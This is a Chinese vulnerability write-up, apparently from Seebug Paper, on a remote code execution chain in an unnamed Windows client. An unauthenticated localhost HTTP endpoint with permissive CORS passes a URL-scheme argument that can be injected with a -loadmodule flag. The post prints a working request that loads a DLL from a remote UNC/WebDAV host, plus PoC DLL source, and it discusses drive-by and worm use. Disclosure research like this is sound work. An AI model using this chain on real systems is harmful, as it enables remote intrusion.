**作者：0xcc  
公众号：[非尝咸鱼贩](https://mp.weixin.qq.com/s/goqpp6JR9WgmUR1wyiXXrQ "非尝咸鱼贩")**

这个公众号一直都在写 iOS 和 mac 相关的，这一篇来换一换口味。这个问题是某个第三方软件的远程代码执行漏洞，结合了本地 TCP
端口的分析、Windows 的 URL Scheme 机制的知识，已经报给相关厂商进行修复。

* * *

一些 PC 端软件通常会在本地监听固定的端口，通过 http 服务的方式向任意浏览器提供后门调用。虽然方便了网页前端开发，却添加了新的攻击面，甚至产生
Web 层面的安全漏洞。

首先使用 sysinternals 工具包里的 TCPView 可以观察到一个第三方的系统服务在 0.0.0.0 上监听了一个 TCP
端口。当然用系统自带的 netstat 命令也可以。

用 IDA Pro 静态分析后发现这是一个 http 服务：

    
    
    C:\Users\haha>curl http://localhost:12345/getinfo -v
    > GET /getinfo HTTP/1.1
    > Host: localhost:11066
    > User-Agent: curl/7.55.1
    > Accept: */*
    >
    * HTTP 1.0, assume close after body
    < HTTP/1.0 200 OK
    < Content-Type: text/html
    < Server: SOME LocalWeb Server
    < Content-Length: 64
    < Accept-Ranges: bytes
    < Access-Control-Allow-origin: *
    < Connection: close
    <
    
    
    someclientinfo({"ver" : "10.12.2789.0" , "_ver" : 50180920})

这个服务不但没有做任何鉴权，还设置了任意网站可访问的 CORS 头（Access-Control-Allow-origin: *），而且是一个 JSONP
的接口。

除了获得版本之外，还有两个接口用来在浏览器中拉起本地 PC 客户端：

  * http://localhost:12345/startclient?cmd=someapp://

  * http://localhost:12345/pullclientjpg?cmd=someapp://

两个接口看上去非常像。

它们都要求 cmd 参数是以 someapp:// 开始的字符串，如果满足条件，就会传递给 ShellExecuteW 打开 URL Scheme。

![](https://images.seebug.org/content/images/2021/04/3fde6656-c406-4c16-9cf5-df2825bda5c4.png-w331s)

区别在于，第一个接口（startclient）存在一个 bug。这个 http 服务是厂商在 C++
上自行实现的，没有用到功能更完备的库，因此在处理一些参数的时候不能完全遵守 http 协议的行为。

startclient 接口使用 GET 获取参数，却没有考虑 URL encode 解码的问题。而 cmd 参数当中出现需要 URL
编码的字符串的概率很大。估计是开发者也意识到了这个问题，保留这个接口用来兼容，但又实现了一个新的接口 pullclientjpg。

第二个接口行为基本一致，多了一层对 cmd 参数的解码，解决了之前的 bug。这个接口将返回一个 1x1 像素的图像。

通过网页拉起特定客户端可以使用 URL scheme 的方式，无论是桌面平台还是手机，主流系统都提供了这种又被称为 Universal Link 的机制。

![
](https://images.seebug.org/content/images/2021/04/6c68db4d-558a-4e08-80a1-0b25584b57ed.png-w331s)

因为涉及到应用切换，为了安全和用户体验考虑（不能被滥用弹窗），浏览器一般会警告用户，要求确认操作。

上文提到的虫洞显然是为了规避这个对话框而设计。但由于 Windows 处理 Universal Link
存在历史遗留的坑，导致了一个严重的远程代码执行问题。

Windows 平台上的 URL Scheme 注册方式和文件扩展名一样都在注册表。也可以用 ftype 命令查看关联信息：

> ftype telnet

由于历史遗留的设计，而 Win32 程序传递 URL（这里需要和 UWP 区分，后者机制不同）是通过命令行参数传递的。

在默认关联应用打开 URL 使用 ShellExecute* 系列函数，而这个函数也可以直接用来运行任意命令。再与 macOS 比较，现在 mac 上
URL 是 URL，命令行是命令行，泾渭分明。

这里给许多第三方应用程序开发者留下了一个坑。假如 URL 处理不当，很容易产生命令行参数注入问题。虽然 ShellExecute 并不像 system
那样支持 shell 命令注入，但结合具体应用程序的业务逻辑，仍然有可能造成远程代码执行。

在本文的例子当中，someapp:// 对应的程序关联如下：

    
    
    C:\Program Files\SomeApp\someapp.exe "%1"

回到前文的 pullclientjpg 接口，这时候给 cmd 参数传入一个带引号的字符串将原始的参数闭合：

    
    
    http://localhost:12345/pullclientjpg?cmd=%22%20-evilflag%3D%22AAA

将执行：

    
    
    C:\Program Files\SomeApp\someapp.exe "someapp://" -evilflag="AAA"

cmd 参数里的引号和空格都被解码后传递给应用程序，除了被截断的 URL 之外，命令行多出来一个 -evilflag 参数。

那么这时候分析 WinMain 函数的调用，逐步走到检查命令行参数的逻辑。如下是其中一部分命令行参数：

-writecookie

-delcookie

-preloadplayermodule

-minidump

-loadmodule

![
](https://images.seebug.org/content/images/2021/04/29fdba31-5d70-4d2d-8db9-60bb9be6e868.png-w331s)

这个 -loadmodule 参数粗暴简单，将对应的字符串传给 LoadLibraryExW 加载运行。因此通过给 someapp://
闭合添加恶意参数，就可以拉起 PC 端应用并加载任意路径的 DLL。

到这里还需要用到 Windows 的一个特性就是 UNC Path。

Windows 系统可以通过 \servername\sharename
的方式访问远程服务器上共享的文件，由操作系统直接处理路径和网络通信，应用程序本身并不需要直接支持相关协议客户端的功能。LoadLibrary 函数便可以通过
UNC 来直接下载并运行远程的动态链接库。

远程共享的协议可以是 SMB 和 WebDAV。由于运营商出于安全考虑在公网上屏蔽了 SMB 相关端口，选择这个协议只在局域网内蠕虫传播有效果。但
WebDAV 可以走 80（或者 443）端口，因此既可以做到主动传播也可以挂马。

串联起来的效果就是，只要给这个服务发送一个构造好的 HTTP 请求，就会拉起客户端，下载运行任意代码。

    
    
    http://localhost:12345/pullclientjpg?cmd=someapp://%22%20-loadmodule%20%22%5C%5Cexample.com%5Chaha%5Cevil.dll%22%20%22

DLL 的示例代码如下，弹出对话框假装只是 XSS 而已：

    
    
    #include "stdafx.h"
    #include <shellapi.h>
    
    void poc()
    {
      wchar_t wCmd[] = L"C:\\Windows\\System32\\calc.exe";
      MessageBoxA(NULL, "xss!", "alert", MB_ICONEXCLAMATION);
    
      STARTUPINFO si = { 0 };
      PROCESS_INFORMATION pi = { 0 };
    
      ZeroMemory(&si, sizeof(si));
      si.cb = sizeof(si);
      ZeroMemory(&pi, sizeof(pi));
    
      CreateProcessW(NULL, wCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
      ExitProcess(0);
    }
    
    BOOL APIENTRY DllMain(HMODULE hModule,
      DWORD  ul_reason_for_call,
      LPVOID lpReserved
    )
    {
      switch (ul_reason_for_call)
      {
      case DLL_PROCESS_ATTACH:
        poc();
        break;
    
      case DLL_THREAD_ATTACH:
      case DLL_THREAD_DETACH:
      case DLL_PROCESS_DETACH:
        break;
      }
      return TRUE;
    }

![
](https://images.seebug.org/content/images/2021/04/b300922a-d76d-46c0-ba3f-15b915b973dc.png-w331s)

把这个 DLL 通过 smb 或者 WebDAV（推荐后者）发布即可。Windows 自带的 IIS 就可以配置 WebDAV
服务器，步骤繁琐，建议使用这个 Python 的实现：https://github.com/wolf71/TinyWebDav

前文提到这个 http 服务是监听在 0.0.0.0 上的。所以攻击向量可以是：

  1. 1-click 的浏览器钓鱼。通过在网页挂马的形式感染受影响的客户端。一个  就可以实现
  2. 0-click 蠕虫传播。在公网和局域网上直接批量扫描对应的端口并执行任意代码

在软件漏洞研究上，无论是攻击还是防御，攻击面都是一个很重要的因素。开发者设计这个功能的初衷可能是为了减少弹窗，提升用户体验，却不巧增加了攻击面。在引入一个功能的时候，不妨多想想带来的风险和功能的实用性是否划算？

这个漏洞可蠕虫可挂马，也利用到了 Windows 的一些特性，算是很典型的通过逆向挖 Web 洞的体验。

出于负责任披露考虑，文中出现的具体端口、字符串等做了模糊化处理。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1558/>

